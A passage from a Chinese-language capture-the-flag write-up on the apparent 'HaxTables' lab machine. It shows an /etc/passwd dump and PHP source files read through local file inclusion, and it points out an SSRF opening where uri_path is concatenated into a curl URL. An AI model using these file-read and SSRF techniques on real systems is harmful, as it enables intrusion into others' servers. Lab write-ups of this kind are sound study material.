class="line">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure><p>尝试读取一下刚刚爆破出来的php文件，即index.php和handler.php，index.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;HaxTables&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/main.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./assets/js/main.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=<span class="string">&quot;center&quot;</span>&gt;HaxTables&lt;/h1&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">nav</span> <span class="title">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">inverse</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">HaxTables</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Home</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">toggle</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">dropdown</span>&quot; <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Convertions</span>&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">caret</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">menu</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">string</span>&quot;&gt;<span class="title">String</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">integer</span>&quot;&gt;<span class="title">Integer</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">image</span>&quot;&gt;<span class="title">Images</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">About</span> <span class="title">us</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">api</span>&quot;&gt;<span class="title">API</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;integer&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/integer.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/string.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;image&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/image.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;api&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;./includes/api.html&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/index.html&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;./includes/index.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>一些简单业务处理，那查看一下handler.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">make_api_call</span>(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这里包含了..&#x2F;api&#x2F;utils.php文件，也读取一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">jsonify</span>([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$post</span>));</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在handler.php中调用了utils.php中的make_api_call对POST传入的参数进行了处理，重点查看make_api_call函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$post</span>));</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$uri_path拼接到$url中，将post传入的参数传入到拼接后的url中，并发起请求，返回请求结果。</p><p>接着我们再利用这个LFI查看一下image.haxtables.htb中的文件，文件位置在&#x2F;var&#x2F;www&#x2F;image&#x2F;index.php，文件内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了utils.php，查看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">jsonify</span>([<span class="string">&quot;message&quot;</span> =&gt; <span 